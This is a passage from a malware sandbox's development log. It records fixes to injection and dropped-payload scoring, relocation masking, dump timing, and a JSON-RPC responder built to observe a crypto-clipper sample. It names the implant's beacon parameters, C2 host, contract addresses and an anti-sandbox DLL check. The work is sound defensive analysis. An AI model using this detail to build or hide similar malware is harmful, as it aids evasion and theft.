dumps (`t3`, `t10`) and `header_mismatch` in every child dump. Same file, same
base, two different verdicts. `no_reference: 4` total. Probably the ordinary
before/after of the hollow, but the reference lookup returning *"no matching
build"* where it later returns *"different build"* is worth one look — those are
different claims and only one of them is evidence.

#### 0bo. THE THREE DEFECTS THE RUNS FOUND, FIXED — 18 Aug

**Four detonations emptied the proving queue and filled the build one.** All
three are host-side, none needed a VM, and each is pinned by tests. **687
passing, up from 662.**

**1. `process_injection`'s reason line contradicted its own detail.** The chain
had branches for the three in-target routes, `unmapped_pe_images` and
`unmapped_memory_crashes`, then an unconditional `else` claiming Sysmon —
**two of the five routes had no branch at all.** On run `677547d9` the card read
`detail: "0 injection event(s) …"` directly above
`reason: "Sysmon recorded process injection (CreateRemoteThread)."` The score
was right and the sentence under it was false, which is worse than silence.

Extracted to `_injection_reason()` so it is testable, with the two missing
branches added and the Sysmon line now reachable only when Sysmon saw something.
Seven tests, including one that iterates every counter `present` is computed
from and **requires a distinct sentence for each** — so a sixth route added
without a branch fails there rather than silently borrowing another's.

**2. `payload_dropped` reached `strong` on compiler scratch files.** Run
`33fe6c3b` dropped exactly two files and both were `csc.exe` output:

    C:\Users\adam\AppData\Local\Temp\zrudxjpg\zrudxjpg.dll
    C:\Users\adam\AppData\Local\Temp\hryya5bb\hryya5bb.dll

Real files, really written by the sample's tree — the collection was right and
the *claim* was wrong. **Every PowerShell script calling `Add-Type` drops
these**, and that population is mostly legitimate administration. A category
reaching `strong` on a compiler's scratch is the volume-driven model the score
design exists to avoid.

`path_is_compiler_artifact()` recognises the CodeDom shape —
`<temp>\<name>\<name>.dll|.pdb` with directory and stem equal, plus
`CSC<hex>.TMP` / `RES<hex>.tmp`. **Set aside and counted, not erased**: the
record keeps `compiler_artifact`, keeps the reasons that would have made it
suspicious, and the summary carries `compiler_artifacts` — the same treatment
`pe_carve` gives `resource_only` images. Twelve tests, and the ones that matter
are the refusals: the real drop to `%APPDATA%\whcjHybcIRKrlH.exe` still scores,
a payload at `<temp>\evil\payload.dll` still scores, and a `.exe` in the
compiler's own shape still scores.

**3. The module-integrity cache thrashed to nothing.** `_CACHE_LIMIT = 96` with
`_REFERENCE_CACHE.clear()` as its eviction, against a `powershell.exe` sample
carrying **380 modules**. The access pattern is *for each dump, for each
module*, so that combination is not a small cache — it is no cache. **24 of run
`33fe6c3b`'s 27 minutes.**

Replaced with a **byte-bounded LRU** (256 MB, 4096-entry backstop). A count is
the wrong bound: 96 entries is 2 MB or 200 MB depending which DLLs they are, and
what needs bounding is memory. Measured after the change: **120 real System32
modules all retained, 51 MB** — where the old code would have cleared at 96 — so
`33fe6c3b`'s 380 modules land near 160 MB, inside budget, and dumps 2–5 become
nearly free instead of repeating dump 1's work.

**And per-dump progress**, because that pass being slow was indistinguishable
from it being hung: one status line was emitted before the loop and nothing
until it finished. It now names the dump and its module count as it goes — the
same principle as *an empty result from a disabled collector looks exactly like
a sample that did nothing*, applied to the teardown.

> **The obvious optimisation is measured and does not work, recorded so nobody
> re-derives it.** `fast_load=True` parsing only
> `IMAGE_DIRECTORY_ENTRY_BASERELOC` is **1.1x**, not the 5–10x it looks like:
> `relocate_image` forces the parse regardless, so the resource tree was never
> the cost. The cache was.

**Left deliberately undone:** the spawn-dump race (`0bm`) and gap 5's carver
branch (`0bn`). The race is now scoped to targets that die within about a
second — `677547d9` dumped 7 of 7 — so *recording the limitation* may be the
right answer rather than building suspend-on-sighting into the watcher. That is
a decision, not a defect, and it wants making rather than assuming.

#### 0bp. RUN `eb3e1273`, 20 Aug — one fix confirmed, one diagnosis retracted

**The verification run for `0bo`, same sample and same settings as `33fe6c3b` so
the only variable was the code.**

**Fix 2 lands exactly as predicted:**

    score               105 -> 90
    suspicious drops      2 -> 0
    compiler_artifacts         2
    payload_dropped     gone from the categories

Both drops -- `x1xpbrqg.dll` and `egxuppms.dll` -- flagged `compiler_artifact`.
**Different random names from the previous run**, so it is matching the CodeDom
*shape* rather than strings that happened to be in a fixture. The score falling
is the false positive leaving the tally, which is the intended direction.

**Fix 3's diagnosis was wrong, and the number that misled it is worth naming.**
Teardown went 1,629s -> 1,554s on a run doing *more* work (6 dumps, 1,392 MB).
`0bm` blamed the module-integrity cache on `modules_compared: 380` against a
96-entry limit. **That 380 was a total across five dumps, not a per-dump count.**
This run breaks it out:

    83, 83, 83, 83, 96, 66  =  494 across six dumps

**83 per dump never approached the old limit**, so the cache never thrashed and
was never the bottleneck. The LRU change is still right on its own terms -- a
byte bound beats a count, and the eviction regression stays pinned -- but it
does not explain 23 minutes and `0bm` should not have claimed it would.

**YARA is ruled out by the same run:** 23 seconds total across all six dumps.
**Where the ~1,374s of teardown goes is still unidentified**, and it is not
getting a third guess.

**So the instrument goes in before the next diagnosis.** `_emit` now tags every
status line with how long the *previous* step took, above a 2-second floor:

    Exporting Procmon CSV...
    Parsing Procmon events...   [+2s]
    Comparing loaded modules against their files (6 dump(s))...   [+1374s]

One `perf_counter` per line, and it profiles **every** pass at once -- including
ones nobody has suspected. Seven tests, and the one that matters pins the
reading convention: **the elapsed belongs to the step before the line, not to
it**, because the pane is a list of starts.

> **And `0bo`'s per-dump progress was emitted in the wrong place.** It printed
> on *completion*, so the single case it existed for -- grinding through dump 1
> -- produced no output at all. Five minutes of silence on this run looked
> exactly like the hang it was built to rule out. Now emitted **before** each
> dump, with the dump's name. A progress indicator that only reports finished
> work is not one.

**Two results this run produced that are not about the fixes.**

**`SecurityHealthHost.exe` was captured** (pid 7408, `process-exit`, 77 MB)
where both attempts failed on `33fe6c3b`. **The spawn-dump race is timing, not
structure** -- which retires the idea that it needs a watcher redesign and makes
"record the limitation" the likelier answer.

**And the carver recovered a 258,048-byte payload from it**, at
`0x1b4bcca0000` -- an address no module covers. **That is the shape gap 5's
`strong` branch needs**, in a process that is not on the list, so it graded
`0 in a process loaders hollow`. Module integrity saw nothing here (all 494
`identical`) because this is not an overwrite of the main image but a payload in
a private allocation. **The two detectors split exactly along the line `0bn`
predicted**, from opposite sides: Dridex's overwrite-in-place was invisible to
the carver and caught by module integrity; this one is the reverse.

#### 0bq. RUN `fa23508d`, 20 Aug — GAP 5's `strong` BRANCH FIRES, AND IT IS A FALSE POSITIVE

**The branch that has never fired since it was written fired here, and it is
wrong.** That is a better outcome than another silent run, and it is the most
important thing four days of detonations have produced.

    process_injection   present=True  strong=True
    detail: 8 unmapped PE image(s) in memory (8 in a process loaders hollow)
    reason: A PE image was found in the memory of a binary loaders commonly
            hollow, at an address that process's own module list does not cover

**Every one of the eight is a .NET image inside `csc.exe`:**

    8 x ('csc.exe', 'unmapped', dotnet=True)

`csc.exe` is the C# compiler. **The sample spawned it legitimately** — it is
what `Add-Type` shells out to — and it is in `HOLLOWING_TARGETS`. A managed
process normally carries assemblies the CLR mapped rather than the loader, at
addresses the module list does not cover. **That is ordinary .NET, scored as
injection.**

**And the actually-hollowed process was not captured.** `SecurityHealthHost.exe`
failed both dumps again (`Target process no longer running`), so the one process
that *was* hollowed contributed nothing, and the verdict rests entirely on the
compiler. The race is now 1 capture in 3 attempts across `33fe6c3b`,
`eb3e1273` and this run — intermittent, not structural.

**This is structural, not a fluke, and the list makes it worse.**
`HOLLOWING_TARGETS` holds `regsvcs`, `regasm`, `installutil`, `msbuild`,
`aspnet_compiler`, `addinprocess`, `addinutil`, `ngen`, `jsc`, `csc`, `vbc`,
`ilasm` — **almost all of them managed processes**. Any of them, running
legitimately and dumped, will show unmapped .NET images. The gate does not need
a malicious sample to fire; it needs a dump.

**The reasoning to prevent this is already in the file, applied to the wrong
route.** `process_injection`'s own comment says:

> In a *managed* process, JIT-compiled code also lives in private allocations
> with no module mapped, so an ordinary .NET application that faults in its own
> JITted code produces the same record.

That is why `unmapped_memory_crashes` is only `present` outside a hollowing
target. **The same argument was never applied to the carver route**, which
treats "in a hollowing target" as sufficient for `strong`.

**And the discriminator already exists and is not consulted.** `pe_carve`
computes `dotnet` per image, reports `dotnet_images: 8`, and the scoring path
reads only the count of unmapped images in a target. The information is
collected, printed, and ignored.

**The naive fix is wrong, which is why this is a decision and not a patch.**
Excluding .NET images would blind the detector to **`422e30ed`** — whose payload
*is* a .NET assembly injected into `RegSvcs.exe`, the primary case this whole
gap exists for. What separates them is not the language:

- **FormBook:** payload at `RegSvcs`'s **preferred base `0x400000`**, the real
  image relocated away to `0x00ed0000`.
- **This run:** framework assemblies at `0x20aa7050000` and similar, in a
  process doing exactly what it was started to do.

So the distinguisher is plausibly *where* the image sits and whether the host's
own image was displaced — not whether it is managed. **That wants designing and
measuring, not guessing**, and a benign baseline of a legitimate `csc.exe`,
`RegSvcs.exe` and `MSBuild.exe` is the missing input. `benign_baseline.py`
exists.

**Recorded and deliberately not fixed.** Three times now this file has declined
to move a scoring gate on partial evidence, and this is the case that shows why
the caution was right: the gate was not merely aimed at a rare technique, it was
**scoring an artifact of the technique's own tooling**.

**The status stream is now written to disk.** `metadata\status.log`, beside
`dynamic_run_summary.json`, carrying every line with its wall-clock and its
`[+Ns]` tag. **Nothing ever persisted it before** -- the Output pane is a Tk
text widget, so the one artefact saying *which pass ran when* died with the
window. That cost three runs: `33fe6c3b` stalled with no record of where,
`eb3e1273` gave five minutes of silence with no record of what it was doing,
and `fa23508d` was closed before its timings could be read. The summary JSON
keeps every *result* and none of the *sequence*.

Fourteen tests. One of them caught a real bug during writing: the elapsed tag
was applied inside `if status_cb:`, so a headless run -- the case where the file
is the only record there is -- would have logged every line untimed.

**Also this run:** fix 2 confirmed again (`suspicious: 0`,
`compiler_artifacts: 2`) on a third set of random names, and module integrity
523 modules, all `identical`. Teardown 1,720s. **The timing profile is still
outstanding** — it lives only in the Output pane and the HTML report does not
carry it.

#### 0br. RUN `ff504255`, 20 Aug — THE TEARDOWN COST IS NAMED: `pefile.relocate_image`

**The status log answered it on its first run.** `metadata\status.log` from
`0bp`, read straight off:

    [15:43:39]   module integrity: dump 1 of 5, powershell.exe_12576_t3.dmp
    [16:03:28]   module integrity: dump 2 of 5, ...   [+1266s]
    [16:04:06]   module integrity: dump 3 of 5, ...   [+32s]
    [16:04:07]   module integrity: dump 4 of 5, ...
    [16:04:07]   module integrity: dump 5 of 5, ...
    [16:05:22] Module integrity: ... 381 identical ...   [+51s]

**1,266 seconds on dump 1, and 83 seconds on the other four combined.** Module
integrity is 1,349s of a 1,670s run — **81% of the wall clock** — and it is
almost entirely one dump.

**The LRU cache from `0bo` works.** Dump 2 compares 80 modules in 32s where
dump 1 compares 43 in 1,266s. The references built during dump 1 are being
reused. **What `0bo` got wrong was the cause, not the fix.**

**And it is not a flat per-module cost**, which is what makes the numbers
readable: 29.4s/module on dump 1 against roughly 0.9s for dump 2's new ones. So
it is not "the first dump is cold" — it is **which modules dump 1 contains**.
Dump 1 is at **t3**, when PowerShell loads the CLR.

**Measured on the bench, and it is the whole thing:**

    clr.dll            9.5 MB    27,350 fixups     11.5s
    System.ni.dll     12.1 MB   117,680 fixups     45.5s
    mscorlib.ni.dll   22.1 MB   271,740 fixups    192.8s

**250 seconds for three files, on hardware faster than the guest.** NGEN native
images carry hundreds of thousands of base relocations.

**And the cost splits almost entirely onto one call:**

    open (fast_load) :   0.00s
    parse relocs     :   1.38s
    APPLY relocs     : 186.14s     <-- pefile.relocate_image
                       -------
                       187.52s

**`relocate_image` walks every fixup in a Python loop. That is 99.3% of it.**

**Which makes the fix precise rather than speculative.** The relocation is
applied only so the on-disk bytes line up with the in-memory bytes; relocated
dwords are *expected* to differ, and relocating them is one way to stop them
counting as differences. **Masking them is another, and it needs the parse
(1.4s) without the apply (186s).** Collect the RVAs the fixup entries name --
4 bytes for `HIGHLOW`, 8 for `DIR64` -- and skip those positions when counting
differences.

The verdicts should survive: `identical` stays `identical` because relocated
dwords were the only expected diffs; a hooked module still differs *outside*
its fixups; a replaced image differs everywhere. **`header_mismatch` does not
touch this path at all**, so `0bn`'s Dridex finding -- the only thing this
detector has ever caught in the wild -- is unaffected either way.

> **Three wrong diagnoses preceded this one**, and all three were guesses at
> where time went rather than measurements of it: `0bm` blamed the cache from a
> misread total, `0bp` retracted that, and `0bo`'s progress line was emitted
> after the work so it could not show the one case that mattered. **The
> instrument cost less than any of the guesses and answered on its first run.**

**IMPLEMENTED, 20 Aug.** `_relocation_widths` collects the fixup RVAs and their
widths from the parsed directory; `_blank_spans` zeroes those positions in the
reference when it is cached, and in the in-memory copy at each comparison. The
image is never relocated.

**Measured on the three CLR images that cost run `ff504255` its dump 1:**

    clr.dll           9.5 MB    27,305 fixups   apply   7.5s -> mask 0.00s
    mscorlib.ni.dll  22.1 MB   271,078 fixups   apply 186.2s -> mask 0.04s
    System.ni.dll    12.1 MB   117,370 fixups   apply  46.3s -> mask 0.03s
                                                       240s  ->      0.1s

**The recurring half was checked too, because it is the one that could have made
this worse.** Blanking the reference happens once and is cached; blanking the
*in-memory* side happens on every comparison. For `mscorlib.ni.dll`'s 16.5 MB
`.text`, holding 74,764 spans: **32.7 ms**, so **0.16s across five dumps**
against the 186s it replaces. No hidden cost.

**The verdicts are what the tests guard, not the speed.** Seven of them, and two
carry the argument:

- **a relocated copy still grades `identical`** -- otherwise every legitimately
  relocated module in every dump becomes a finding, which is the regression this
  change could have caused;
- **a patch outside the fixups is still caught** -- an inline hook lands on
  instruction bytes, not on relocation targets, so the mask cannot become a
  blindfold.

The existing `replaced` and `patched` fixtures pass unchanged, which is the
independent check that masking and relocating compare the same content.
`header_mismatch` never touched this path, so `0bn`'s Dridex finding is
unaffected by construction.

**A side effect worth having:** the suite went from ~62s to **13s**, because the
`slow` tests that build real PEs were paying the same cost.

**Fixup counts drop slightly** -- 271,740 to 271,078 for `mscorlib` -- because
`IMAGE_REL_BASED_ABSOLUTE` entries are padding that rewrite nothing and are
deliberately not masked. Masking them would blank real bytes.

#### 0bs. RUN `59a705df`, 20 Aug — the masking fix confirmed on real data, 28 minutes to 7

**Same sample, same settings, one code change.** Run `ff504255` against
`59a705df`:

    module integrity, dump 1     1,266s  ->     15s
    module integrity, all five   1,349s  ->     23s        59x
    whole run                    1,670s  ->    411s         4x

**And the verdicts are identical, which is the half that mattered.**

    ff504255 : 381 identical, 0 patched, 0 replaced, 0 header_mismatch, 0 no_reference
    59a705df : 385 identical, 0 patched, 0 replaced, 0 header_mismatch, 0 no_reference

The module count differs by four because the process loaded four more; every
verdict is the same. **Masking the fixups and relocating the image compare the
same content on live data**, which is what the two fixture tests predicted and
what a detector with one live finding to its name needed before this shipped.

**The teardown has no dominant cost left.** From `status.log`, everything above
10 seconds:

    Autoruns snapshot (before)      51s
    Stopping FakeNet                45s
    Memory YARA                     34s
    Scheduled tasks (before)        26s
    Module integrity                23s
    PE carve                        10s

Observation is 180s of the 411s, so setup and teardown together are ~231s spread
across a dozen passes. **Nothing here is pathological** — the two snapshot passes
and FakeNet's shutdown are the largest, and they are I/O against the guest rather
than a defect. This is the first run in the record where the profile is flat.

**Fix 2 held for a fourth consecutive run** — `suspicious: 0`,
`compiler_artifacts: 2`, on a fourth set of random names.

**And `SecurityHealthHost.exe` failed to dump again**, so the spawn-dump race
now stands at **1 capture in 5 attempts** (`33fe6c3b` miss, `eb3e1273` hit,
`fa23508d` miss, `ff504255` miss, `59a705df` miss). Intermittent and rare, and
the only route by which this sample's actual hollow ever reaches a detector.

> **The instrument paid for itself twice over.** Three diagnoses of this pass
> were wrong -- `0bm` blamed the cache from a misread total, `0bp` retracted it,
> and `0bo`'s progress line printed after the work so it could not show the one
> case that mattered. `status.log` answered on its first run and the fix
> followed from the measurement in a single pass. **Every guess cost more than
> the instrument did.**

#### 0bt. THE SPAWN-DUMP RACE, FIXED — the child is suspended before it is dumped

**1 capture in 5.** A hollowed `SecurityHealthHost.exe` was missed on
`33fe6c3b`, `fa23508d`, `ff504255` and `59a705df`, caught only on `eb3e1273`.
Every failure read identically:

    Dump 1 error: Target process no longer running.
    0x8007012B  Only part of a ReadProcessMemory request was completed.

**And it is the only process this control actually hollows**, so missing it is
why gap 5 keeps coming back empty on the one sample built to answer it.

**Where the latency is, and why the obvious fixes do not work.** The watcher
polls at 0.5s and the child *passes* the liveness check — the failure is not a
missed sighting. It dies while ProcDump is still starting up. So:

- **a faster poll** does not help: it was already seen;
- **writing the dump in-process** rather than shelling out to `procdump.exe`
  would cut the attach latency and **still race**, because the process can exit
  between `OpenProcess` and the write;
- **reordering the parent dump** was the first hypothesis and it is wrong: the
  parent is imaged once per parent, and on these runs that had already happened
  more than ten seconds earlier.

**Nothing that shrinks the window closes it.** The only fix is to stop the
process from exiting: `_hold_process` opens it with `PROCESS_SUSPEND_RESUME` —
deliberately not `PROCESS_ALL_ACCESS`, since this reaches into a process running
malware — and calls `NtSuspendProcess`. Everything downstream then runs against
a process that cannot exit underneath it, the parent dump included.

**Verified against the shape that keeps being missed**, not asserted: a process
that exits on its own after 1s was held, still alive at 3s, and exited
immediately on release.

**The failure this introduces is worse than the one it fixes, so it is what the
tests are about.** A process left suspended hangs the sample's whole chain and
the run reports a quiet machine. The hold sits in a `try/finally` whose body was
extracted into `_dump_spawned_child` for exactly that reason — the old body had
five `continue` paths and a `finally` covers all of them. Five tests, including
release-after-release on a closed handle, because `_release_process` is called
from a `finally` and an exception there would mask the real one.

**And it changes what the sample experiences, which is recorded rather than
hidden.** ProcDump already freezes a process to image it; what is new is the
freeze starting a second or two earlier. A parent waiting on a child with a
short timeout could see a difference. **Dumps taken this way carry `held: true`**
so a reader comparing two images of one pid knows the second came from a process
this harness stopped rather than one that stopped itself.

**Unproven on a live run.** The mechanism is proven; that it converts this
sample's 1-in-5 into 5-in-5 is not, and the next detonation of
`af2d8300…` is the test. If `SecurityHealthHost.exe` is captured, gap 5 finally
gets the image it has never had — and `0bq`'s question about `csc.exe` becomes
answerable with the hollowed process actually present for comparison.

#### 0bu. RUN `0d469835` — the hold was invisible, and the wrong conclusion was drawn from that

**`0bt`'s fix could not be evaluated, because the field that reports it never
reached the summary.** Every dump record in this run read `held: None` —
including two `csc.exe` spawn dumps that **succeeded** — and `held` is set
*unconditionally* on that path. So the field looked absent in exactly the way a
guest running older code would look.

**It was concluded from that that the guest had not pulled. It had:
`git log -1` on the guest read `478fd03`.** The operator was sent to check a
machine that was already correct.

**The actual cause is one line, and it is this project's most familiar bug
class.** `summarize_memory_dumps` copies a **fixed field set** into the run
summary. `held` was set on the record and never added to the projection, so it
was dropped on the way out. **The collection was right and the reporting lost
it** — the same shape as the four analyzer-attribution bugs this file already
records, and the same shape as the local YARA rules that reached the scan only
after nine days because nothing copied them.

**Both projections now carry it**, and the failure list matters more than the
success list: **a suspended process cannot report "Target process no longer
running"**, so a failure carrying `held: true` means something other than the
race, and one carrying `held: false` says the hold was refused — which is the
case worth chasing.

**And a refused hold now says why.** `_hold_process` returned a bare `None`,
which cannot distinguish *"the process had already gone"* from *"`OpenProcess`
refused it"*. It returns `(handle, reason)` now, the reason carries
`GetLastError` or the `NtSuspendProcess` status, and it is emitted to the status
log and stored on the record. **That ambiguity is why this run cannot say
whether `SecurityHealthHost.exe` was unheld because it had already exited or
because Windows refused the handle** — and those want completely different
fixes.

**What the run does establish**, none of it about the fix:

- **Both `csc.exe` processes were captured**, three dumps including a re-dump,
  where `ff504255` and `59a705df` got none.
- **`SecurityHealthHost.exe` spawned at ~t175** and failed at t177 and t180,
  against t143–t162 on earlier runs. The base window is 180s, so **the watcher
  had about five seconds left** — this run would have been marginal even with
  the hold working. `timeout_seconds: 240` before the next attempt.
- **A second `csc.exe` (pid 760) died inside its +2s re-dump**, so the
  short-lived-child shape is not specific to `SecurityHealthHost`. It is what
  this script's children do.

**Three tests pin the projection**, because a field that exists on the record
and not in the summary is worse than one that was never added: the reader cannot
tell it from a stale binary, which is precisely the mistake made here.

#### 0bv. RUN `c14cb5b6` — the hold works and is not the fix; the payload came out anyway

**Two processes were suspended successfully and both dumps still failed
identically.** That falsifies `0bt`.

    process-spawn  cvtres.exe              pid 4528   held=True  hold_error=''
    process-spawn  SecurityHealthHost.exe  pid 11096  held=True  hold_error=''
      -> Dump 1 error: Target process no longer running.
         0x8007012B  Only part of a ReadProcessMemory request was completed.

**A suspended process cannot exit**, and the same pid `11096` was dumped
successfully 36 seconds later at `t198`. So **ProcDump's message is false** —
the process was running throughout.

**The real error is `0x8007012B`, `ERROR_PARTIAL_COPY`**: ProcDump could not
read parts of the address space. ProcDump renders that as *"Target process no
longer running"*, and **that misleading string is what sent three runs and one
whole fix down the wrong path.** The race was never the cause.

**Why the memory could not be read, and the design error in `0bt`.** The process
is mid-hollow: its image is being unmapped and rewritten. **But the writer is the
parent, not the victim** — PowerShell is doing the injecting. Suspending the
target freezes the wrong process and does nothing for read stability. `0bt`
reasoned about a process exiting under the dump and never asked what was
*changing* under it.

**The hold is kept, with its claim narrowed.** It does prevent a genuine exit
race, it is measured to work, it costs nothing, and it leaves nothing suspended
— but it is not why this sample was missed and must not be recorded as the fix
for it.

**What actually caught the process was the window.** `timeout_seconds` went
180 -> 240. `SecurityHealthHost.exe` spawned at ~t160 and exited at **t198** —
past the old window's close, so the watcher had already stopped. The
**`process-exit` trigger** got it, 77 MB.

**AND THE PAYLOAD CAME OUT.** The carver recovered **258,048 bytes at
`0x164b7250000`, not .NET**, from the hollowed process — the same size as the
one carve on run `33fe6c3b`. **This is the artifact gap 5 has never had.**

**And the score is right for entirely the wrong reason.** `process_injection`
graded **strong**, on `5 unmapped PE image(s) in a process loaders hollow` —
**all five are the .NET assemblies in `csc.exe`** from `0bq`. The genuine
payload is the sixth unmapped image and **contributes nothing**, because
`SecurityHealthHost.exe` is not in `HOLLOWING_TARGETS`.

    csc.exe                 5 unmapped, all dotnet   -> counted, all false
    SecurityHealthHost.exe  1 unmapped, not dotnet   -> the real hollow, ignored

**125 · Likely Malicious, earned entirely by compiler scratch, while the actual
injected payload sat in the same run uncounted.** That is the strongest argument
yet for `0bq`'s gate question, and it is no longer hypothetical: the two errors
now cancel into a correct-looking verdict, which is worse than either alone.

**What this leaves:**

- `0bt`'s hold: works, retained, **not** the fix for this sample.
- **The real blocker on the spawn dump is `ERROR_PARTIAL_COPY` during an active
  hollow.** Suspending the *parent* for the duration of the child's dump is the
  untested idea that follows from this; it was not tried and is not queued.
- **Gap 5 finally has a payload to look at**, from the exit dump rather than the
  spawn dump.
- `timeout_seconds: 240` should be the default for this sample. 180 truncated
  the run before its most interesting process exited.

#### 0bw. QUEUED BUILD, FIRST — answer `eth_call` and watch a clipper do its job

**The only remaining path into this sample's behaviour.** Everything downstream
of the config fetch — substitution, the beacon protocol, the clipboard hook —
was gated on an answer that containment guaranteed it would never get, and the
chain was believed to have nothing to give it either — **that belief is
withdrawn**: the `eth_getCode` that returned `0x` was aimed at `0x0F14fc3b`, a
wallet, and the real contract `0x4E31128a` is unchecked. Re-detonating
`af2d8300…` *did* beat `c14cb5b6`, once the certificate was acceptable.
A responder is the lever, and it is **safer than arming the guest**: the
operator picks the address the implant is handed.

**Build the instrument first — and here that means two phases, not one.** The
request shape is not known. `getData()`'s return encoding is nowhere in the
binary's strings; what exists is the implant's *parser*, and its expectations
are unread. Guessing the ABI shape and getting it wrong produces **the same
observable as a responder that does not work at all** — the implant exits at
t198, exactly as it already does. That is the silence-versus-absence trap this
file keeps re-learning, so phase 1 is built to be unable to fall into it.

**Phase 1 — record the question. No payload design at all. BUILT, 21 Aug:**
`dynamic_analysis\jsonrpc_responder.py`, 24 tests. It answers every request
with a well-formed JSON-RPC error and writes the exact request bytes to the case
directory. One run tells you the method, the params, the block tag, whether
there is a `eth_chainId` / `net_version` handshake in front, and whether the
beacon fires before or after the config fetch. None of that is guessable and all
of it is cheap.

    ..\.venv\Scripts\python.exe -m dynamic_analysis.jsonrpc_responder ^
        --output-dir <case>\network --port 8545

`--reply empty` is the other arm: a successful `0x`, which is what a real node
returns for a contract with no code and therefore the *truthful* answer for this
dead one. It is a different path through the implant's parser than an error, and
C4 is what tells them apart. Raw bytes are kept base64 alongside every parsed
field, because phase 2 is written against them.

**Its own bind is exclusive on purpose.** `SO_REUSEADDR` on Windows lets a
second socket take a port another process already holds, so a responder started
while FakeNet owns 8545 would report `started: True`, receive nothing, and
summarise as `no_connection` -- blaming the diverter for a port collision. A
taken port is now an error at start.

**Phase 2 — answer it. BUILT, 21 Aug:** `dynamic_analysis\jsonrpc_answer.py`,
21 tests. `--answer` on the responder, or `RINGFORGE_RPC_ANSWER=1` under
FakeNet.

**It does not encode one guess; it enumerates them.** What phase 1 cannot read
is the *return shape* -- `getData()`'s ABI signature is nowhere in the binary,
only the implant's parser. The plausible shapes are five and nameable: a bare
`address`, a `string` holding one, a JSON blob, dynamic `bytes`, and no ABI
framing at all. **Rotation advances only on retry**, which is the whole trick:
the first call gets the first shape, and the implant *asking again* is the
signal that the last one was rejected. Acceptance and rejection therefore land
in the same log and one run sweeps the list. `--plan` pins one shape for a
focused re-run once the answer is known.

Reading the summary's `answer` block: **one plan served then silence** means it
was accepted or the implant gave up, and process lifetime past t198 is what
separates those. **Every plan served and still asking** means the candidate list
is what is wrong, not the wiring.

**The served address is a tracer**, `0xC0FFEE…C0FFEE`, synthetic and shaped to
be unmistakable in a clipboard, a dump or a beacon body -- so finding it is
proof of substitution rather than something argued from context. `--address`
points at an operator-controlled sink. **Never a real wallet**: the whole safety
argument for a responder is that the operator picks the C2.

**The beacon needs nothing built.** `method=refresh&guid=` and
`method=send&guid=&address=` are ordinary form-encoded POSTs, and FakeNet writes
those out already under `DumpHTTPPosts`, which is on in the stock config.

**Where it plugs in — BUILT, 21 Aug.** `fakenet_config_path` was threaded
through (`orchestrator.py:1996` -> `2328`) and unused; this is the repo's first
custom config. The route is FakeNet's own **custom-response** mechanism: a
`RawListener` section on `8545` with `Custom:` naming an ini whose `TcpDynamic:`
names a Python file, which FakeNet `load_source`s and calls as `HandleTcp(sock)`,
handing the socket over completely. Read out of `RawListener.py` rather than
recalled. **Both paths resolve relative to the directory holding the main
config**, which is why the generator writes all three files into one directory.

    ..\.venv\Scripts\python.exe make_fakenet_config.py --out C:\fakenet-0bw

`scripts\make_fakenet_config.py` **appends text; it does not round-trip the
config through `configparser`**, which drops every comment and lowercases option
names. FakeNet's default config is mostly comments explaining containment
switches, and it is the one file on the bench where a silent reformat could mean
traffic leaving the guest. It also checks three things and reports rather than
corrects them: `8545` already having a listener, `8545` sitting in
`BlackListPortsTCP`, and `RedirectAllTraffic` being off. The first two produce
`no_connection`, which is indistinguishable from a silent implant unless the
generator says so before the run.

**Blacklisting `8545` in the diverter was the obvious wiring and it is wrong.**
An undiverted port follows whatever address DNS returned, which is not
guaranteed to be local. Routing through a custom response keeps every packet
inside FakeNet's diversion; containment is not a setting to work around.

**`TcpDynamic` rather than `HttpDynamic`**, because the HTTP hook hands over an
already-parsed request and phase 2 is encoded against raw bytes. It also catches
a client that does not speak HTTP, which a hand-rolled implant may not.
`raw_source` on every record says `wire` or `reconstructed` so this cannot be
assumed later.

**What the log must separate, because FakeNet already gives it a TCP peer and a
connection therefore proves nothing:**

    never resolved  |  resolved, never connected  |  connected, sent nothing
    sent something we did not recognise  |  sent eth_call, answered

A responder that records only "served a response" is documentation.

**Pre-registered predictions:**

| | prediction |
|---|---|
| C1 | `SecurityHealthHost.exe` resolves `data-seed-prebsc-1-s1.binance.org` and connects to `:8545` — **a control, not a finding**; `c14cb5b6` already did this. If it fails the run is void |
| C2 | The request is an HTTP POST carrying JSON-RPC `eth_call`, naming contract `0x0F14fc3b…` and selector `0x3bc5de30` |
| C3 | **No** `eth_chainId` / `net_version` handshake precedes it — stated weakly and on purpose, because it is the cheapest thing to be wrong about |
| C4 | Given the phase-1 error reply, the process still exits at ~t198 — reproducing the baseline and proving the responder changed nothing it should not |
| C5 | *(phase 2)* Given a well-formed answer, the process **lives past t198**. This is the whole result: t198 is the current ceiling and it exists only because the fetch failed |

**C5 is the one to state loudly.** If it holds, every behaviour this sample has
never shown becomes reachable and gap 5's first identified payload finally has
runtime evidence behind its static identification. If it fails *with* C2
confirmed, the parser rejected the encoding and phase 2 iterates on the ABI
shape — which is a known, bounded problem rather than a mystery.

**Bounds on the negative.** A responder the implant never talks to says nothing
about the implant; it says the diverter did not route `8545`. C1 is what makes
that distinguishable, and without C1 nothing below it may be written up.

**Prerequisites.** `timeout_seconds: 240` — 180 truncates before `t198` and
there is no result at all below that. **The sample is not on this host**; it is
re-acquired by hash, see *Environment facts*. Detection for the technique is
already committed (`tools\yara\local\ringforge_etherhiding.yar`), so a phase-2
run also exercises those two rules against live memory rather than a carve.

#### 0av. QUEUED DETONATION, FIRST — what did the crash gate actually find?

**This is the run to do, and `0au` rides along on the same capture.** The crash
question is older, it blocks `0au`, and it needs no new collector.

**The measurement.** The gate stores `0x32dfd514` only when a module lookup for
`0xe11da208` succeeds. 931 guest module names matched nothing, and the guest
stored it anyway. What has never been checked is **the `Load Image` list for the
sample's own processes** — which is what the loader list it walks is made of. An
inventory taken at another moment, or scoped to the machine rather than to
`RegSvcs.exe`, misses a DLL injected into that process and later unloaded, and
`sbiedll.dll` is exactly a DLL other software injects.

`scripts/crash_gate_check.py` reads a Procmon CSV and does it:

    ..\.venv\Scripts\python.exe crash_gate_check.py <procmon.csv> --process RegSvcs.exe

It hashes every image loaded into the scoped processes, in load order, in four
forms each (filename and stem, ascii and UTF-16LE), asserts the CRC against
`ntdll.dll` and `sbiedll.dll` before reporting anything, and prints **positive
controls** — a capture where not even `ntdll.dll` hashes correctly is one whose
negative means nothing.

**Pre-registered predictions:**

| | prediction |
|---|---|
| C1 | `Load Image` events exist for `RegSvcs.exe` — the collector was listening |
| C2 | `ntdll.dll`, `kernel32.dll` and `user32.dll` appear as positive controls |
| C3 | **Nothing** hashes to `0xe11da208` |
